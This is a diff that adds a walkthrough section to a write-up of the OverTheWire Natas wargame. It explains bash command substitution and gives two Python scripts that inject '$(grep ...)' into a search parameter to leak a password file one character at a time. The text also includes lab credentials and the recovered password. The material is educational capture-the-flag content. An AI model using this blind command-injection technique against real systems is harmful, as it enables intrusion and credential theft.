@@ -755,6 +755,46 @@ if($key != "") {
 As you can see, now the characters `` ` ``, `\`, `'`, `"` are restricted. This renders the solution from [Level 10](#level-10) useless. However, despite this, there are still special characters that have not been
 prohibited; namely, `$` and `()`. 
 
+These three characters can be used in Linux bash when you want to enforce an ordering of command execution like PEMDAS in algebra. If you want to first execute an inner/nested command that will then become the value
+for the outer command, you follow the format: `outerCommand $(innerCommand)`. For example, if you have a file called 'abc' that has the line "hel" in it, you could write something like `echo $(cat abc)lo` to print "hello".
+
+Another key piece to this puzzle is the same line of code from [Level 9](#level-9) and [Level 10](#level-10), `passthru("grep -i \"$key\" dictionary.txt")`. Remember that it takes your input and uses `grep` to search for
+matching words in the dictionary.
+
+```python
+import requests
+from string import *
+
+target = 'http://natas16.natas.labs.overthewire.org/'
+
+charset = ascii_lowercase + ascii_uppercase + digits
+
+pwd_set = ''
+for c in charset:
+    needle = ('password$(grep ' + c + ' /etc/natas_webpass/natas17)')
+    r = requests.get(target, auth=('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'), params={"needle": needle})
+
+    if 'password' not in r.text:
+        pwd_set += c
+        print(pwd_set)
+```
+
+
+```python
+password = ''
+while len(password) != 32:
+    for c in pwd_set:
+        needle = ('password$(grep ^' + password + c + ' /etc/natas_webpass/natas17)')
+        r = requests.get(target, auth=('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'), params={"needle": needle})
+
+        if 'password' not in r.text:
+            password += c
+            print(password)
+            break
+```
+
+Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+
 ---
 
 #### Level 18
